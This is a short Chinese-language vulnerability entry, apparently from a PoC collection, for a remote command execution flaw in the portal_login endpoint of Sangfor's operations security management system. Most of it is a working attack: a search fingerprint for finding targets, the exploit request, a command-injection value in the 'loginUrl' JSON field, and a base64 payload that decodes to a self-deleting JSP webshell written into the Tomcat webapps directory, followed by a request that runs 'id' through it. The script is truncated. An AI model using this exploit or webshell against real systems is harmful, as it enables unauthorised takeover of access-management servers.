# 深信服运维安全管理系统portal_login存在远程命令执行漏洞

- **系统**：深信服　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/fort/login"`
- **请求**：`POST /fort/portal_login HTTP/1.1`
- **关键头**：`Content-Type: application/json`　`Content-Length: 94`　`Content-Type: application/json`　`Cookie: FORTSESSIONID=78DFD83A276124B65ECA5D316D66D47F`　`Priority: u=0, i`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```
PCUgamF2YS5pby5JbnB1dFN0cmVhbSBpbiA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKS5nZXRJbnB1dFN0cmVhbSgpO2ludCBhID0gLTE7Ynl0ZVtdIGIgPSBuZXcgYnl0ZVsyMDQ4XTtvdXQucHJpbnQoIjxwcmU+Iik7d2hpbGUoKGE9aW4ucmVhZChiKSkhPS0xKXtvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIsMCxhKSk7fW91dC5wcmludCgiPC9wcmU+Iik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg== base64 -d >/usr/local/tomcat/webapps/fort/gw/poiu.jsp #
GET /fort/gw/poiu.jsp?cmd=id HTTP/1.1
Host:
"{\"userName\":\"Bob\", \"loginUrl\":\"`id`\", \"role\": \"\", \"password\": \"…（脚本共 615 字，完整版见原文）
```